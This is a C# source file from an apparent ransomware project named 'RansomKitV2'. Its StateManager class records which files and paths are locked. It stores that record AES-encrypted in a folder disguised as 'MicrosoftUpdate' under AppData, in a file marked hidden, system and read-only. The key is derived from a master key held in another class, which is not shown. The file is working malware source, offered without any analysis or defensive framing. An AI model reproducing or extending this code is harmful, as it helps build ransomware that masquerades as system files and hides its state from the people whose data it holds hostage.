using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

namespace RansomKitV2
{
    internal sealed class StateData
    {
        public List<string> Files { get; set; } = new();
        public List<string> Paths { get; set; } = new();
        public bool Locked { get; set; }
        public string CreatedUtc { get; set; } = DateTime.UtcNow.ToString("o");
    }

    internal static class StateManager
    {
        private static readonly string Dir =
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                         "MicrosoftUpdate");
        private static readonly string FilePath = Path.Combine(Dir, "svc_conf.dat");

        public static void Save(StateData data)
        {
            Directory.CreateDirectory(Dir);
            byte[] json = JsonSerializer.SerializeToUtf8Bytes(data);

            byte[] key = DeriveKey();
            byte[] iv = RandomNumberGenerator.GetBytes(16);
            byte[] ct;
            using (var aes = Aes.Create())
            {
                aes.Key = key; aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                using var enc = aes.CreateEncryptor();
                ct = enc.TransformFinalBlock(json, 0, json.Length);
            }

            byte[] blob = new byte[16 + ct.Length];
            Buffer.BlockCopy(iv, 0, blob, 0, 16);
            Buffer.BlockCopy(ct, 0, blob, 16, ct.Length);

            if (File.Exists(FilePath))
            {
                try { File.SetAttributes(FilePath, FileAttributes.Normal); } catch { }
            }
            File.WriteAllText(FilePath, Convert.ToBase64String(blob), Encoding.ASCII);
            try
            {
                File.SetAttributes(FilePath,
                    FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
            }
            catch { }
            CryptographicOperations.ZeroMemory(key);
        }

        public static StateData? Load()
        {
            try
            {
                if (!File.Exists(FilePath)) return null;
                try { File.SetAttributes(FilePath, FileAttributes.Normal); } catch { }

                byte[] blob = Convert.FromBase64String(File.ReadAllText(FilePath, Encoding.ASCII));
                if (blob.Length < 32) return null;

                byte[] iv = new byte[16];
                Buffer.BlockCopy(blob, 0, iv, 0, 16);
                int ctLen = blob.Length - 16;
                byte[] ct = new byte[ctLen];
                Buffer.BlockCopy(blob, 16, ct, 0, ctLen);

                byte[] key = DeriveKey();
                byte[] json;
                using (var aes = Aes.Create())
                {
                    aes.Key = key; aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    using var dec = aes.CreateDecryptor();
                    json = dec.TransformFinalBlock(ct, 0, ctLen);
                }
                CryptographicOperations.ZeroMemory(key);

                return JsonSerializer.Deserialize<StateData>(json);
            }
            catch { return null; }
            finally
            {
                try
                {
                    if (File.Exists(FilePath))
                        File.SetAttributes(FilePath,
                            FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                }
                catch { }
            }
        }

        public static void Clear()
        {
            try
            {
                if (File.Exists(FilePath))
                {
                    File.SetAttributes(FilePath, FileAttributes.Normal);
                    File.Delete(FilePath);
                }
            }
            catch { }
        }

        private static byte[] DeriveKey()
        {
            using var sha = SHA256.Create();
            return sha.ComputeHash(Encoding.UTF8.GetBytes(
                "RansomKitV2::State::" + CryptoEngine.MasterKeyString));
        }
    }
}